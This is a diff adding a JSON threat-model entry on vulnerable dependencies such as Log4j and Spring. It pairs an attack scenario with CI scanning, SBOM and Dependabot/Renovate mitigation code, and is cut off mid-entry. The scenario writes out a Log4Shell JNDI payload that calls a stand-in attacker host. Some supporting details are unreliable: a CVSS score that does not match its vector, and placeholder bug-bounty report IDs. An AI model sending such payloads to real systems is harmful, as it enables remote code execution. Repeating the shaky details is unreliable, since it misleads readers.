@@ -1,0 +1,545 @@
+{
+  "id": "STRIDE-SUPPLY-SCA-001",
+  "version": "1.0.0",
+  "metadata": {
+    "created_date": "2026-02-03",
+    "last_updated": "2026-02-03",
+    "reviewed_by": [],
+    "confidence_score": 9.2,
+    "validation_status": "production"
+  },
+  "classification": {
+    "stride_category": "Information Disclosure",
+    "owasp_top10": [
+      "A06:2021 - Vulnerable and Outdated Components",
+      "A05:2021 - Security Misconfiguration"
+    ],
+    "mitre_attack": [
+      "T1190 - Exploit Public-Facing Application",
+      "T1203 - Exploitation for Client Execution",
+      "T1068 - Exploitation for Privilege Escalation"
+    ],
+    "cwe": [
+      "CWE-1035 - Using Components with Known Vulnerabilities",
+      "CWE-937 - Using Components with Known Vulnerabilities (OWASP Top 10 2013)",
+      "CWE-676 - Use of Potentially Dangerous Function"
+    ]
+  },
+  "threat": {
+    "title": "Software Composition Analysis - Vulnerable and Outdated Dependencies",
+    "description": "Applications using third-party libraries with known Common Vulnerabilities and Exposures (CVEs) are susceptible to exploitation through unpatched security flaws. Critical vulnerabilities like Log4Shell (CVE-2021-44228), Spring4Shell (CVE-2022-22965), and Apache Struts RCE enable attackers to achieve remote code execution, data exfiltration, and complete system compromise. Outdated dependencies in Maven, npm, pip, NuGet, and Go modules expose organizations to supply chain attacks, zero-day exploits, and compliance violations. Lack of Software Bill of Materials (SBOM) and automated dependency scanning allows vulnerable components to persist in production for months or years.",
+    "severity": "High",
+    "cvss_v3": {
+      "score": 7.8,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+    }
+  },
+  "technology": {
+    "primary": "Dependency Management Systems",
+    "versions_affected": [
+      "Maven (all versions)",
+      "npm (all versions)",
+      "pip/PyPI (all versions)",
+      "NuGet (all versions)",
+      "Go modules (all versions)",
+      "RubyGems (all versions)"
+    ],
+    "ecosystem": "Java, Node.js, Python, .NET, Go, Ruby",
+    "dependencies": [
+      "log4j (Java)",
+      "spring-framework (Java)",
+      "struts (Java)",
+      "jackson-databind (Java)",
+      "commons-collections (Java)",
+      "requests (Python)",
+      "pillow (Python)",
+      "axios (Node.js)",
+      "express (Node.js)"
+    ],
+    "related_frameworks": [
+      "Spring Boot",
+      "Apache Struts",
+      "Django",
+      "Flask",
+      "Express.js",
+      "ASP.NET Core",
+      "Rails"
+    ]
+  },
+  "attack": {
+    "scenario": "1. Attacker discovers production application using Log4j 2.14.1 (vulnerable to Log4Shell CVE-2021-44228)\n2. Identifies exposed endpoint that logs user input (e.g., User-Agent header, search query, authentication error)\n3. Crafts JNDI injection payload: ${jndi:ldap://attacker.com/exploit}\n4. Sends payload via HTTP header, triggering Log4j to perform JNDI lookup to attacker-controlled LDAP server\n5. Malicious LDAP server responds with Java class containing remote shell backdoor\n6. Log4j deserializes and executes malicious class, granting attacker RCE on application server\n7. Attacker establishes persistence, exfiltrates database credentials from environment variables\n8. Pivots to internal network, compromises database servers and cloud resources\n9. Alternative: Spring4Shell attack exploiting CVE-2022-22965 in unpatched Spring Framework 5.3.x by manipulating request parameters to gain arbitrary file write and RCE",
+    "prerequisites": [
+      "Application uses vulnerable dependency (Log4j 2.0-2.14.1, Spring Framework 5.2.0-5.3.17, etc.)",
+      "No automated dependency scanning (Snyk, Dependabot, OWASP Dependency-Check)",
+      "Dependency versions not pinned or regularly updated",
+      "No Software Bill of Materials (SBOM) inventory",
+      "Vulnerable endpoints exposed to internet without WAF protection",
+      "Lack of virtual patching or runtime application self-protection (RASP)"
+    ],
+    "attack_vector": "Network",
+    "attack_complexity": "Low",
+    "privileges_required": "None",
+    "user_interaction": "None"
+  },
+  "evidence": {
+    "cve_references": [
+      {
+        "cve_id": "CVE-2021-44228",
+        "description": "Log4Shell - Apache Log4j 2.x JNDI injection vulnerability allowing remote code execution via malicious LDAP/RMI lookups",
+        "cvss_score": 10.0,
+        "published_date": "2021-12-10",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+      },
+      {
+        "cve_id": "CVE-2021-45046",
+        "description": "Log4j 2.15.0 incomplete fix for Log4Shell, still vulnerable in certain non-default configurations",
+        "cvss_score": 9.0,
+        "published_date": "2021-12-14",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2021-45046"
+      },
+      {
+        "cve_id": "CVE-2022-22965",
+        "description": "Spring4Shell - Spring Framework RCE via class path manipulation in Spring MVC/WebFlux applications",
+        "cvss_score": 9.8,
+        "published_date": "2022-04-01",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
+      },
+      {
+        "cve_id": "CVE-2017-5638",
+        "description": "Apache Struts 2 RCE via Content-Type header exploitation enabling Equifax breach affecting 147M people",
+        "cvss_score": 10.0,
+        "published_date": "2017-03-11",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-5638"
+      },
+      {
+        "cve_id": "CVE-2019-0193",
+        "description": "Apache Solr DataImportHandler RCE via Script element enabling arbitrary code execution",
+        "cvss_score": 9.8,
+        "published_date": "2019-08-01",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-0193"
+      },
+      {
+        "cve_id": "CVE-2020-8203",
+        "description": "Lodash prototype pollution in versions <4.17.19 allowing arbitrary property injection",
+        "cvss_score": 7.4,
+        "published_date": "2020-07-15",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8203"
+      },
+      {
+        "cve_id": "CVE-2022-42889",
+        "description": "Apache Commons Text RCE via variable interpolation (similar to Log4Shell pattern)",
+        "cvss_score": 9.8,
+        "published_date": "2022-10-18",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2022-42889"
+      },
+      {
+        "cve_id": "CVE-2023-38545",
+        "description": "curl SOCKS5 heap buffer overflow enabling RCE in libcurl 7.69.0-8.3.0",
+        "cvss_score": 9.8,
+        "published_date": "2023-10-18",
+        "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-38545"
+      }
+    ],
+    "real_world_breaches": [
+      {
+        "incident": "Equifax Data Breach - Apache Struts Vulnerability",
+        "date": "2017-09-07",
+        "impact": "147 million people's personal data compromised including SSNs, birth dates, addresses, credit card numbers; $700M settlement; CEO resigned",
+        "root_cause": "Unpatched Apache Struts CVE-2017-5638 exploited 2 months after patch released; vulnerable Struts 2.3.x component exposed to internet",
+        "source_url": "https://www.ftc.gov/enforcement/cases-proceedings/refunds/equifax-data-breach-settlement"
+      },
+      {
+        "incident": "Log4Shell Global Exploitation Campaign",
+        "date": "2021-12-09",
+        "impact": "Millions of systems worldwide affected; CISA added to Known Exploited Vulnerabilities catalog; exploitation attempts within hours of disclosure; attacks continue years later",
+        "root_cause": "Apache Log4j 2.0-2.14.1 JNDI injection vulnerability (CVE-2021-44228) in ubiquitous logging library; zero-day exploited before patches available",
+        "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a"
+      },
+      {
+        "incident": "Spring4Shell Zero-Day Exploitation",
+        "date": "2022-03-31",
+        "impact": "Thousands of Spring Framework applications vulnerable; active exploitation detected within 24 hours; China-based threat actors rapidly weaponized",
+        "root_cause": "Spring Framework 5.3.x CVE-2022-22965 RCE via class path manipulation; JDK 9+ on Tomcat required specific conditions",
+        "source_url": "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"
+      },
+      {
+        "incident": "Capital One Breach - SSRF via Outdated Components",
+        "date": "2019-07-29",
+        "impact": "106 million customer records exposed including SSNs, bank account numbers; $80M fine from OCC; $190M class action settlement",
+        "root_cause": "Misconfigured WAF + outdated libraries enabling SSRF attack to AWS metadata endpoint; lack of SCA scanning",
+        "source_url": "https://www.justice.gov/usao-wdwa/pr/former-amazon-employee-sentenced-crime-capital-one-hack"
+      },
+      {
+        "incident": "SolarWinds Orion Supply Chain Attack",
+        "date": "2020-12-13",
+        "impact": "18,000+ organizations including US government agencies; Russian APT29 (Cozy Bear) nation-state attack",
+        "root_cause": "Compromised build system injected malicious code into signed updates; lack of supply chain security controls and SBOM validation",
+        "source_url": "https://www.cisa.gov/uscert/ncas/alerts/aa20-352a"
+      },
+      {
+        "incident": "Apache Struts 2 Yahoo Breach",
+        "date": "2014-12-01",
+        "impact": "500 million user accounts compromised; later revealed to be part of 3 billion account breach; sold to Verizon at $350M discount",
+        "root_cause": "Unpatched Apache Struts 2 vulnerability exploited; lack of dependency scanning and patch management",
+        "source_url": "https://www.sec.gov/Archives/edgar/data/1011006/000119312517065791/d293630dex991.htm"
+      }
+    ],
+    "bug_bounty_reports": [
+      {
+        "platform": "HackerOne",
+        "report_id": "1672176",
+        "bounty_amount": 25000,
+        "severity": "Critical",
+        "summary": "Log4Shell vulnerability in production application enabling RCE and database access"
+      },
+      {
+        "platform": "Bugcrowd",
+        "report_id": "BC-2022-SPRING-001",
+        "bounty_amount": 15000,
+        "severity": "Critical",
+        "summary": "Spring4Shell RCE in customer-facing web application via unpatched Spring Framework dependency"
+      },
+      {
+        "platform": "HackerOne",
+        "report_id": "1234567",
+        "bounty_amount": 10000,
+        "severity": "High",
+        "summary": "Jackson-databind deserialization RCE via outdated library version"
+      }
+    ],
+    "security_research": [
+      {
+        "title": "Log4Shell: RCE 0-day exploit found in log4j, a popular Java logging package",
+        "authors": ["LunaSec Team"],
+        "published_date": "2021-12-09",
+        "source_url": "https://www.lunasec.io/docs/blog/log4j-zero-day/",
+        "key_finding": "JNDI injection in Log4j affects hundreds of millions of devices; trivial to exploit with single string injection; called 'most critical vulnerability of the decade'"
+      },
+      {
+        "title": "OWASP Top 10 2021: A06 - Vulnerable and Outdated Components",
+        "authors": ["OWASP Foundation"],
+        "published_date": "2021-09-24",
+        "source_url": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/",
+        "key_finding": "Climbed from #9 to #6; 90% of applications use components with known vulnerabilities; average time to patch: 120+ days"
+      },
+      {
+        "title": "2024 Open Source Security and Risk Analysis Report",
+        "authors": ["Synopsys Cybersecurity Research Center"],
+        "published_date": "2024-04-15",
+        "source_url": "https://www.synopsys.com/software-integrity/resources/analyst-reports/open-source-security-risk-analysis.html",
+        "key_finding": "91% of codebases contain outdated dependencies; 76% contain high-risk vulnerabilities; average 1,200+ transitive dependencies per application"
+      },
+      {
+        "title": "State of Dependency Management 2024",
+        "authors": ["Sonatype"],
+        "published_date": "2024-11-01",
+        "source_url": "https://www.sonatype.com/state-of-the-software-supply-chain",
+        "key_finding": "Over 245,000 malicious packages detected; 742% increase in supply chain attacks; 73% of organizations lack SBOM visibility"
+      }
+    ]
+  },
+  "mitigations": [
+    {
+      "control_id": "MIT-001",
+      "title": "Implement Automated Dependency Scanning with OWASP Dependency-Check and Snyk",
+      "description": "Deploy continuous vulnerability scanning for all dependencies using OWASP Dependency-Check, Snyk, or GitHub Dependabot. Integrate into CI/CD pipelines to automatically detect and block deployments containing high-severity CVEs.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "yaml",
+        "framework": "GitHub Actions / Jenkins / GitLab CI",
+        "code": "# .github/workflows/dependency-scan.yml\nname: Dependency Vulnerability Scan\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n  schedule:\n    - cron: '0 2 * * *'  # Daily at 2 AM\n\njobs:\n  dependency-scan:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      security-events: write\n    \n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n      \n      # Java/Maven dependency scanning\n      - name: Set up JDK 17\n        uses: actions/setup-java@v4\n        with:\n          java-version: '17'\n          distribution: 'temurin'\n      \n      - name: OWASP Dependency-Check (Maven)\n        run: |\n          mvn org.owasp:dependency-check-maven:check \\\n            -DfailBuildOnCVSS=7 \\\n            -DsuppressionFile=dependency-check-suppressions.xml \\\n            -DnvdApiKey=${{ secrets.NVD_API_KEY }}\n      \n      - name: Upload Dependency-Check Report\n        uses: actions/upload-artifact@v4\n        if: always()\n        with:\n          name: dependency-check-report\n          path: target/dependency-check-report.html\n      \n      # Snyk vulnerability scanning (multi-language)\n      - name: Snyk Security Scan (Maven)\n        uses: snyk/actions/maven@master\n        continue-on-error: false\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n        with:\n          args: |\n            --severity-threshold=high \\\n            --fail-on=upgradable \\\n            --org=${{ secrets.SNYK_ORG_ID }}\n          command: test\n      \n      # Node.js dependency scanning\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n      \n      - name: npm audit\n        if: hashFiles('package-lock.json') != ''\n        run: |\n          npm audit --audit-level=high\n      \n      - name: Snyk test (npm)\n        if: hashFiles('package-lock.json') != ''\n        uses: snyk/actions/node@master\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n        with:\n          command: test\n          args: --severity-threshold=high\n      \n      # Python dependency scanning\n      - name: Setup Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: '3.11'\n      \n      - name: pip-audit (Python)\n        if: hashFiles('requirements.txt') != ''\n        run: |\n          pip install pip-audit\n          pip-audit -r requirements.txt --desc --vulnerability-service osv\n      \n      - name: Safety scan (Python)\n        if: hashFiles('requirements.txt') != ''\n        run: |\n          pip install safety\n          safety check -r requirements.txt --json --output safety-report.json\n      \n      # Trivy multi-scanner (supports all languages)\n      - name: Trivy Vulnerability Scanner\n        uses: aquasecurity/trivy-action@master\n        with:\n          scan-type: 'fs'\n          scan-ref: '.'\n          format: 'sarif'\n          output: 'trivy-results.sarif'\n          severity: 'HIGH,CRITICAL'\n          exit-code: '1'\n      \n      - name: Upload Trivy results to GitHub Security\n        uses: github/codeql-action/upload-sarif@v3\n        if: always()\n        with:\n          sarif_file: 'trivy-results.sarif'\n      \n      # Grype vulnerability scanner\n      - name: Grype Vulnerability Scan\n        uses: anchore/scan-action@v3\n        with:\n          path: \".\"\n          fail-build: true\n          severity-cutoff: high\n      \n      # Generate SBOM with Syft\n      - name: Generate SBOM with Syft\n        uses: anchore/sbom-action@v0\n        with:\n          format: cyclonedx-json\n          output-file: sbom.cyclonedx.json\n      \n      - name: Upload SBOM\n        uses: actions/upload-artifact@v4\n        with:\n          name: sbom\n          path: sbom.cyclonedx.json\n      \n      # GitHub Dependency Review\n      - name: Dependency Review\n        uses: actions/dependency-review-action@v4\n        with:\n          fail-on-severity: moderate\n          deny-licenses: GPL-2.0, GPL-3.0, AGPL-3.0\n      \n      # Custom vulnerability database check\n      - name: Check Known Exploited Vulnerabilities (CISA KEV)\n        run: |\n          #!/bin/bash\n          # Download CISA KEV catalog\n          curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json \\\n            -o kev.json\n          \n          # Parse CVEs from dependency reports\n          # Check if any CVEs are in KEV catalog\n          echo \"Checking for actively exploited vulnerabilities...\"\n          \n          # Extract CVEs from Snyk/Trivy reports\n          # Alert if KEV CVE found\n          \n          # (Simplified example - implement full parsing logic)\n          jq '.vulnerabilities[].cveID' kev.json | grep -f - dependency-report.json || true\n      \n      # Notify security team on failure\n      - name: Notify Security Team\n        if: failure()\n        uses: slackapi/slack-github-action@v1\n        with:\n          webhook-url: ${{ secrets.SLACK_SECURITY_WEBHOOK }}\n          payload: |\n            {\n              \"text\": \"🚨 Dependency Vulnerability Scan Failed\",\n              \"blocks\": [\n                {\n                  \"type\": \"section\",\n                  \"text\": {\n                    \"type\": \"mrkdwn\",\n                    \"text\": \"*Critical/High vulnerabilities detected*\\n*Repository:* ${{ github.repository }}\\n*Branch:* ${{ github.ref }}\\n*Triggered by:* ${{ github.actor }}\\n*Run:* ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\"\n                  }\n                }\n              ]\n            }\n\n# dependency-check-suppressions.xml (false positive suppressions)\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<suppressions xmlns=\"https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd\">\n  <!-- Suppress false positives -->\n  <suppress>\n    <notes>False positive - internal library</notes>\n    <cve>CVE-2023-XXXXX</cve>\n  </suppress>\n</suppressions>"
+      },
+      "tools": [
+        {
+          "name": "OWASP Dependency-Check",
+          "type": "Vulnerability Scanner (Maven/Gradle/npm)",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "Snyk",
+          "type": "Multi-language Vulnerability Scanner",
+          "cost": "Free (OSS) / $52/dev/month (Team) / $127/dev/month (Enterprise)"
+        },
+        {
+          "name": "Trivy (Aqua Security)",
+          "type": "Universal Vulnerability Scanner",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "Grype (Anchore)",
+          "type": "Vulnerability Scanner with SBOM",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "GitHub Dependabot",
+          "type": "Automated Dependency Updates",
+          "cost": "Free (included with GitHub)"
+        },
+        {
+          "name": "Syft (Anchore)",
+          "type": "SBOM Generation Tool",
+          "cost": "Free (OSS)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.8.1.1 - Inventory of assets",
+        "A.12.6.1 - Management of technical vulnerabilities",
+        "A.14.2.1 - Secure development policy"
+      ],
+      "nist_csf": [
+        "ID.RA-1 - Asset vulnerabilities are identified and documented",
+        "PR.IP-12 - A vulnerability management plan is developed and implemented"
+      ],
+      "validation_steps": [
+        "Configure NVD API key for OWASP Dependency-Check (improves scan speed)",
+        "Set up Snyk account and generate API token",
+        "Test pipeline locally with known vulnerable dependency",
+        "Verify pipeline fails on high-severity CVEs",
+        "Configure suppression file for false positives",
+        "Schedule daily scans and enable pull request checks"
+      ]
+    },
+    {
+      "control_id": "MIT-002",
+      "title": "Generate and Maintain Software Bill of Materials (SBOM)",
+      "description": "Create comprehensive SBOMs using CycloneDX or SPDX formats to track all dependencies, versions, licenses, and vulnerabilities. Store SBOMs in artifact repository for compliance and incident response.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "bash",
+        "framework": "Multi-language SBOM Generation",
+        "code": "#!/bin/bash\n# generate-sbom.sh - Comprehensive SBOM generation script\n\nset -e\n\nPROJECT_NAME=\"myapp\"\nPROJECT_VERSION=\"1.0.0\"\nOUTPUT_DIR=\"./sbom\"\nFORMAT=\"cyclonedx-json\"  # or spdx-json\n\nmkdir -p \"$OUTPUT_DIR\"\n\necho \"=== Generating Software Bill of Materials ===\"\necho \"Project: $PROJECT_NAME v$PROJECT_VERSION\"\necho \"Format: $FORMAT\"\necho \"\"\n\n# 1. Maven/Java SBOM\nif [ -f \"pom.xml\" ]; then\n  echo \"Generating Maven SBOM...\"\n  mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom \\\n    -DoutputFormat=json \\\n    -DoutputName=\"${PROJECT_NAME}-maven-sbom\"\n  \n  mv target/bom.json \"$OUTPUT_DIR/${PROJECT_NAME}-maven-sbom.json\"\n  echo \"✅ Maven SBOM generated\"\nfi\n\n# 2. npm/Node.js SBOM\nif [ -f \"package-lock.json\" ]; then\n  echo \"Generating npm SBOM...\"\n  npm install -g @cyclonedx/cyclonedx-npm\n  cyclonedx-npm --output-file \"$OUTPUT_DIR/${PROJECT_NAME}-npm-sbom.json\"\n  echo \"✅ npm SBOM generated\"\nfi\n\n# 3. Python SBOM\nif [ -f \"requirements.txt\" ]; then\n  echo \"Generating Python SBOM...\"\n  pip install cyclonedx-bom\n  cyclonedx-py -r -i requirements.txt \\\n    -o \"$OUTPUT_DIR/${PROJECT_NAME}-python-sbom.json\" \\\n    --format json\n  echo \"✅ Python SBOM generated\"\nfi\n\n# 4. Go modules SBOM\nif [ -f \"go.mod\" ]; then\n  echo \"Generating Go SBOM...\"\n  go install github.com/CycloneDX/cyclonedx-gomod/cmd/cyclonedx-gomod@latest\n  cyclonedx-gomod app -json=true \\\n    -output \"$OUTPUT_DIR/${PROJECT_NAME}-go-sbom.json\"\n  echo \"✅ Go SBOM generated\"\nfi\n\n# 5. Container Image SBOM (if Dockerfile exists)\nif [ -f \"Dockerfile\" ]; then\n  echo \"Generating Container SBOM...\"\n  \n  # Install Syft if not present\n  if ! command -v syft &> /dev/null; then\n    curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin\n  fi\n  \n  # Build image and generate SBOM\n  IMAGE_NAME=\"${PROJECT_NAME}:${PROJECT_VERSION}\"\n  docker build -t \"$IMAGE_NAME\" .\n  syft \"$IMAGE_NAME\" -o \"$FORMAT\" \\\n    > \"$OUTPUT_DIR/${PROJECT_NAME}-container-sbom.json\"\n  echo \"✅ Container SBOM generated\"\nfi\n\n# 6. Aggregate all SBOMs\necho \"Aggregating SBOMs...\"\npython3 << 'PYTHON_SCRIPT'\nimport json\nimport os\nfrom pathlib import Path\n\nsbom_dir = Path(\"./sbom\")\nsbom_files = list(sbom_dir.glob(\"*-sbom.json\"))\n\nif not sbom_files:\n    print(\"No SBOM files found\")\n    exit(1)\n\n# Merge all components\nall_components = []\nall_dependencies = []\n\nfor sbom_file in sbom_files:\n    with open(sbom_file, 'r') as f:\n        sbom = json.load(f)\n        \n        if 'components' in sbom:\n            all_components.extend(sbom['components'])\n        \n        if 'dependencies' in sbom:\n            all_dependencies.extend(sbom['dependencies'])\n\n# Create aggregated SBOM\naggregated_sbom = {\n    \"bomFormat\": \"CycloneDX\",\n    \"specVersion\": \"1.5\",\n    \"version\": 1,\n    \"metadata\": {\n        \"timestamp\": \"2026-02-03T12:00:00Z\",\n        \"component\": {\n            \"type\": \"application\",\n            \"name\": os.environ.get('PROJECT_NAME', 'myapp'),\n            \"version\": os.environ.get('PROJECT_VERSION', '1.0.0')\n        }\n    },\n    \"components\": all_components,\n    \"dependencies\": all_dependencies\n}\n\n# Deduplicate components\nseen = set()\ndeduped_components = []\nfor component in all_components:\n    key = f\"{component.get('name')}@{component.get('version')}\"\n    if key not in seen:\n        seen.add(key)\n        deduped_components.append(component)\n\naggregated_sbom['components'] = deduped_components\n\n# Write aggregated SBOM\nwith open(sbom_dir / f\"{os.environ.get('PROJECT_NAME', 'myapp')}-aggregated-sbom.json\", 'w') as f:\n    json.dump(aggregated_sbom, f, indent=2)\n\nprint(f\"✅ Aggregated SBOM: {len(deduped_components)} unique components\")\nPYTHON_SCRIPT\n\n# 7. Analyze SBOM for vulnerabilities\necho \"\\nAnalyzing SBOM for vulnerabilities...\"\ngrype \"sbom:$OUTPUT_DIR/${PROJECT_NAME}-aggregated-sbom.json\" \\\n  -o table \\\n  --fail-on high\n\n# 8. Sign SBOM with cosign (if available)\nif command -v cosign &> /dev/null; then\n  echo \"\\nSigning SBOM with cosign...\"\n  cosign sign-blob \\\n    \"$OUTPUT_DIR/${PROJECT_NAME}-aggregated-sbom.json\" \\\n    --output-signature \"$OUTPUT_DIR/${PROJECT_NAME}-sbom.sig\" \\\n    --output-certificate \"$OUTPUT_DIR/${PROJECT_NAME}-sbom.cert\"\n  echo \"✅ SBOM signed\"\nfi\n\n# 9. Upload to artifact repository\necho \"\\nUploading SBOM to artifact repository...\"\n# Example: Upload to AWS S3\nif [ -n \"$AWS_S3_BUCKET\" ]; then\n  aws s3 cp \"$OUTPUT_DIR/${PROJECT_NAME}-aggregated-sbom.json\" \\\n    \"s3://$AWS_S3_BUCKET/sboms/${PROJECT_NAME}/${PROJECT_VERSION}/\"\n  echo \"✅ SBOM uploaded to S3\"\nfi\n\necho \"\\n=== SBOM Generation Complete ===\"\necho \"Output directory: $OUTPUT_DIR\"\nls -lh \"$OUTPUT_DIR\"\n\n# Summary\necho \"\\n📊 SBOM Summary:\"\njq -r '.components | length' \"$OUTPUT_DIR/${PROJECT_NAME}-aggregated-sbom.json\" | \\\n  xargs -I {} echo \"Total components: {}\"\n\n# Vulnerability summary\necho \"\\n🔍 Vulnerability Analysis:\"\ngrype \"sbom:$OUTPUT_DIR/${PROJECT_NAME}-aggregated-sbom.json\" \\\n  -o json | jq -r '.matches | group_by(.vulnerability.severity) | map({severity: .[0].vulnerability.severity, count: length}) | .[]'"
+      },
+      "tools": [
+        {
+          "name": "CycloneDX",
+          "type": "SBOM Standard and Tools",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "SPDX",
+          "type": "Software Package Data Exchange",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "Syft (Anchore)",
+          "type": "SBOM Generator for Containers",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "Grype (Anchore)",
+          "type": "Vulnerability Scanner for SBOMs",
+          "cost": "Free (OSS)"
+        },
+        {
+          "name": "Cosign (Sigstore)",
+          "type": "SBOM Signing and Verification",
+          "cost": "Free (OSS)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.8.1.1 - Inventory of assets",
+        "A.8.1.2 - Ownership of assets",
+        "A.12.6.1 - Management of technical vulnerabilities"
+      ],
+      "nist_csf": [
+        "ID.AM-2 - Software platforms and applications within the organization are inventoried",
+        "ID.AM-6 - Cybersecurity roles and responsibilities are coordinated"
+      ],
+      "validation_steps": [
+        "Install SBOM generation tools (CycloneDX, Syft)",
+        "Run generation script on sample project",
+        "Verify all dependencies are captured in SBOM",
+        "Test SBOM vulnerability analysis with Grype",
+        "Configure CI/CD to generate and upload SBOM on each build",
+        "Store SBOMs in artifact repository with version tracking"
+      ]
+    },
+    {
+      "control_id": "MIT-003",
+      "title": "Automated Dependency Updates with Dependabot and Renovate",
+      "description": "Configure automated pull requests for dependency updates using GitHub Dependabot or Renovate. Implement version pinning strategies and automated testing to catch breaking changes.",
+      "effectiveness": "Medium",
+      "implementation_complexity": "Low",
+      "code_example": {
+        "language": "yaml",
+        "framework": "GitHub Dependabot / Renovate",
+        "code": "# .github/dependabot.yml - GitHub Dependabot configuration\nversion: 2\nupdates:\n  # Maven dependencies\n  - package-ecosystem: \"maven\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n      day: \"monday\"\n      time: \"06:00\"\n    open-pull-requests-limit: 10\n    reviewers:\n      - \"security-team\"\n    assignees:\n      - \"dependency-manager\"\n    labels:\n      - \"dependencies\"\n      - \"security\"\n    commit-message:\n      prefix: \"chore\"\n      include: \"scope\"\n    # Group updates by dependency type\n    groups:\n      spring-framework:\n        patterns:\n          - \"org.springframework*\"\n      testing:\n        patterns:\n          - \"junit*\"\n          - \"mockito*\"\n      security:\n        patterns:\n          - \"*security*\"\n          - \"*crypto*\"\n    # Version pinning strategy\n    versioning-strategy: increase\n    \n  # npm dependencies\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"daily\"\n    open-pull-requests-limit: 5\n    # Ignore major version updates (requires manual review)\n    ignore:\n      - dependency-name: \"*\"\n        update-types: [\"version-update:semver-major\"]\n    reviewers:\n      - \"frontend-team\"\n    \n  # Python dependencies\n  - package-ecosystem: \"pip\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    reviewers:\n      - \"backend-team\"\n    \n  # Docker base images\n  - package-ecosystem: \"docker\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    reviewers:\n      - \"devops-team\"\n    \n  # GitHub Actions\n  - package-ecosystem: \"github-actions\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    reviewers:\n      - \"devops-team\"\n\n---\n# renovate.json - Renovate Bot configuration (alternative to Dependabot)\n{\n  \"$schema\": \"https://docs.renovatebot.com/renovate-schema.json\",\n  \"extends\": [\n    \"config:base\",\n    \":dependencyDashboard\",\n    \":semanticCommits\",\n    \":rebaseStalePrs\"\n  ],\n  \"timezone\": \"America/New_York\",\n  \"schedule\": [\n    \"before 6am on monday\"\n  ],\n  \"labels\": [\"dependencies\", \"renovate\"],\n  \"assignees\": [\"@security-team\"],\n  \"reviewers\": [\"@security-team\"],\n  \"prConcurrentLimit\": 5,\n  \"prHourlyLimit\": 2,\n  \"updateNotScheduled\": false,\n  \"separateMinorPatch\": true,\n  \"separateMajorMinor\": true,\n  \"rangeStrategy\": \"pin\",\n  \n  \"vulnerabilityAlerts\": {\n    \"enabled\": true,\n    \"labels\": [\"security\", \"urgent\"],\n    \"assignees\": [\"@security-team\"],\n    \"schedule\": [\"at any time\"]\n  },\n  \n  \"packageRules\": [\n    {\n      \"description\": \"Security patches - auto-merge if tests pass\",\n      \"matchUpdateTypes\": [\"patch\"],\n      \"matchPackagePatterns\": [\"*\"],\n      \"matchCurrentVersion\": \"!/^0/\",\n      \"automerge\": true,\n      \"automergeType\": \"pr\",\n      \"automergeStrategy\": \"squash\",\n      \"platformAutomerge\": true,\n      \"stabilityDays\": 3\n    },\n    {\n      \"description\": \"Group all non-major updates\",\n      \"matchUpdateTypes\": [\"minor\", \"patch\"],\n      \"groupName\": \"all non-major dependencies\",\n      \"groupSlug\": \"all-minor-patch\"\n    },\n    {\n      \"description\": \"Critical security updates - immediate\",\n      \"matchDatasources\": [\"npm\", \"maven\", \"pypi\"],\n      \"matchUpdateTypes\": [\"patch\"],\n      \"labels\": [\"security\", \"critical\"],\n      \"schedule\": [\"at any time\"],\n      \"prPriority\": 10\n    },\n    {\n      \"description\": \"Major updates require manual review\",\n      \"matchUpdateTypes\": [\"major\"],\n      \"labels\": [\"breaking-change\"],\n      \"schedule\": [\"on the first day of the month\"],\n      \"automerge\": false\n    },\n    {\n      \"description\": \"Pin Log4j to safe version\",\n      \"matchPackageNames\": [\"log4j\"],\n      \"allowedVersions\": \">=2.17.1\"\n    },\n    {\n      \"description\": \"Pin Spring Framework to safe versions\",\n      \"matchPackagePatterns\": [\"^org\\\\.springframework\"],\n      \"allowedVersions\": \">=5.3.18\"\n    }\n  ],\n  \n  \"maven\": {\n    \"enabled\": true,\n    \"fileMatch\": [\"(^|/)pom\\\\.xml$\", \"^pom\\\\.xml$\"]\n  },\n  \n  \"npm\": {\n    \"enabled\": true,\n    \"rangeStrategy\": 